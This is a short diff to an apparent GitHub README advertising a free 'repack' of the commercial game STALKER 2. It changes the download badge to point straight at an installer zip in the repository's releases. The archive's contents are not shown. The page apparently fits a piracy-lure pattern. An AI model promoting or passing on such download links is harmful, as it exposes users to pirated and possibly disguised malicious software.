@@ -4,7 +4,7 @@ Welcome to the repack edition of STALKER 2: Heart of Chernobyl, an epic, story-d
 
 
 # Download:
-[<img src="https://img.shields.io/badge/STALKER2_FREE-DOWNLOAD_NOW-blue?style=for-the-badge">](https://github.com/portergoz6655/Stalker-2-Hear-Of-Chernobyl-Repack/blob/main/STALKER2%20-%20LINK.txt)
+[<img src="https://img.shields.io/badge/STALKER2_FREE-DOWNLOAD_NOW-blue?style=for-the-badge">](https://github.com/portergoz6655/Stalker-2-Hear-Of-Chernobyl-Repack/releases/download/stalker-2/Stalker2_Install.zip)
 
 
 
